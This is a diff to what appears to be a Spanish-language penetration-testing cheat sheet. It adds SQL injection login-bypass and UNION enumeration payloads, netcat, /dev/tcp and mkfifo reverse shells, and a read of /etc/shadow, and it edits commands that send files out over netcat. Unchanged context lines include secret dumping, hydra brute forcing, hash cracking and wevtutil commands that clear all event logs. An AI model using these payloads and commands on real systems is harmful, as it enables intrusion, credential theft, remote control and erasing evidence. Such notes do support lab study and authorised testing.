@@ -510,14 +510,40 @@ lsa_dump_secret #Obtener credenciales secretas
 
 # BBDD
 
-## **Injección manual**
+## **SQL Injection**
+### **Bypass de autenticación con una condición siempre verdadera**
+```Mysql
+User: ' OR '1'='1
+Passwd: ' OR '1'='1
 ```
-'or '1'='1
+
+### **Inyección para anular la validación de la contraseña**
+```Mysql
+User: admin' --
+Passwd: Campo vacio
+```
+
+### **Inyección de múltiples líneas**
+```Mysql
+User: admin') OR ('1'='1
+Passwd: Campo vacio
+```
+
+### **Inyección para extraer la primera tabla en bases de datos MySQL (basada en error)**
+```Mysql
+User: ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --
+Passwd: Campo vacio
+```
+
+### **Inyección para enumerar usuarios**
+```Mysql
+User: ' UNION SELECT null, username FROM users --
+Passwd: Campo vacio
 ```
 
 ## **Inyección SQL automática**
 
-```
+```Bash
 sqlmap -u <url>
 sqlmap -u <url> -p <parámetro> --dbs
 sqlmap -u <url> --tables
@@ -574,16 +600,16 @@ hydra -L usuarios.txt -P rockyou.txt 10.10.242.126 http-post-form "/login:userna
 
 # Cracking y Hasehes
 ## **Password Cracking con John**
-```
+```Bash
 john --format=[tipo_de_hash] [hash_file] --wordlist=[wordlist]
 ```
 
-```
+```Bash
 john --wordlist /usr/share/rockyou.txt "hash.txt"
 ```
 
 ## **Password Cracking con Hascat**
-```
+```Bash
 hashcat -m [tipo_de_hash] -a 0 [hash_file] [wordlist]
 ```
 
@@ -693,20 +719,22 @@ rlwrap nc -nvlp 443
 ### **Escucha desde nuestra maquina**
 Nuestra maquina
 ```Bash
-nc -lvp <4444> > <archivo.txt>
+nc -lvp <4444> > <archivo>
 ```
 ###  **Transferencia Linux**
 ```
-nc -w 3 <target> <port> < <archivo>
+nc -w 3 <IP> <port> < <archivo>
 ```
 ### **Transferencia Windows**
 ```
-nc.exe 10.9.0.118 4444 < "C:\Program Files (x86)\Spoofer\firewall.vbs"
+nc.exe <IP> <PORT> < "C:\Program Files (x86)\Spoofer\firewall.vbs"
 ```
 
 ## **Shell con netcat**
-```
-nc <192.168.0.14> <4444> -e /bin/bash
+```Bash
+nc <IP> <PORT> -e /bin/bash
+/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 #Ubunutu
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f #Cuando no sirve nc -e /bin/bash
 ```
 
 ## **Pivoting con netcat**
@@ -740,6 +768,7 @@ nc -c bash 10.10.10.3 4444
 # TTY Interactiva
 ```Bash
 script /dev/null -c bash
+CNTRL+Z
 stty raw -echo; fg
 	reset
 	xterm
@@ -794,7 +823,7 @@ Invoke-WebRequest -Uri http://192.168.0.14:80/nc.exe -OutFile C:\Users\Wolf\Down
 ## **Netcat**
 ### **Receptor**
 ```
-rlwrap nc -lvnp 1234 > file.txt
+nc -lvnp 1234 > file.txt
 ```
 
 ### **Emisor**
@@ -857,6 +886,7 @@ uname -a #Muestra información del sistema operativo y el kernel.
 uname -m #Muestra la arquitectura del sistema
 arch #Muestra la arquitectura del sistema
 lsb_release -a #Muestra la version del sistema
+uname -r #Muestra la versión del kernel
 cat /etc/issue #Muestra la versión del sistema operativo.
 cat /etc/*-release #Muestra información detallada del sistema operativo.
 cat /etc/crontab #Enumera tareas programadas.
@@ -877,6 +907,7 @@ sudo -l #Lista los privilegios sudo del usuario actual.
 cat /etc/passwd #Enumera usuarios del sistema.
 cat /etc/group #Enumera grupos del sistema.
 cat /etc/sudoers #Enumera usuarios con privilegios sudo.
+cat /etc/shadow  #Contiene contraseñas cifradas
 ```
 
 ### **Conexiones**
@@ -921,7 +952,7 @@ sudo systemctl poweroff #Apagar sistema
 
 ### **Permisos y binarios**
 ```Bash
-find / -perm -4000 2>/dev/null #Encontrar direcctorio y binarios
+find / -perm -4000 2>/dev/null #Buscar archivos SUID o SGID
 find / -perm -4000 -ls 2>/dev/null #Encontrar direcctorio y binarios
 find / -type f -perm -4000 2>/dev/null #Encontrar solo binarios
 find / -writable -type d 2>/dev/null#Encontrar directorios con permisos de escritura
@@ -930,6 +961,7 @@ find / -perm -g=s -type f 2>/dev/null #Busca binarios con permisos SGID.
 find / -type f -name "*.sh" -exec ls -la {} \; #Enumera scripts con permisos de ejecución.
 find / -type f -name "*.py" \( -perm -u=x -o -perm -g=x -o -perm -o=x \) 2>/dev/null #Enumera fichero .py ejecutables
 find / -group user -type f 2>/dev/null #Enumera ficheros que tiene acceso el usuario
+find / -type f -name "*.sh" -exec ls -l {} \; #Buscar scripts mal configurados
 locate <archivo> #Buscar la ubicación del archvivo en el sistema
 locate -i <archivo> #Para desactivar mayusculas y minusculas
 sudo updatedb #Actualiza la base de datos que utiliza el comando locate
@@ -1150,6 +1182,40 @@ wevtutil cl Application #Borrar registro de aplicaciones
 FOR /F "tokens=*" %G IN ('wevtutil el') DO wevtutil cl "%G" #Borrar todos los registros
 ```
 
+
+# Entorno virtual (venv)
+## **Configurar entorno virtual**
+```Bash
+python3 -m venv venv
+source venv/bin/activate
+```
+
+## **Añadir al path**
+```Bash
+export PATH="$PATH:/opt/impacket"
+source ~~/.zshrc # Cargamos la configuración
+```
+
+## **Activar entorno virtual**
+```Bash
+source path/to/configure/venv/bin/activate
+```
+
+## **Desactivar entorno virtual**
+```Bash
+deactivate
+```
+
+## **Comprobar si se ejecuta entorno virtual**
+```Bash
+echo $VIRTUAL_ENV
+```
+
+# Ocultar prueba pentesting
+```
+kali-undercover
+```
+
 # Diccionarios
 ## **Diccionario Fuzzing Web**
 ```
@@ -1196,9 +1262,6 @@ FOR /F "tokens=*" %G IN ('wevtutil el') DO wevtutil cl "%G" #Borrar todos los re
 https://github.com/danielmiessler/SecLists
 ```
 
-# **Ocultar prueba pentesting**
-```
-kali-undercover
-```
+
 
 
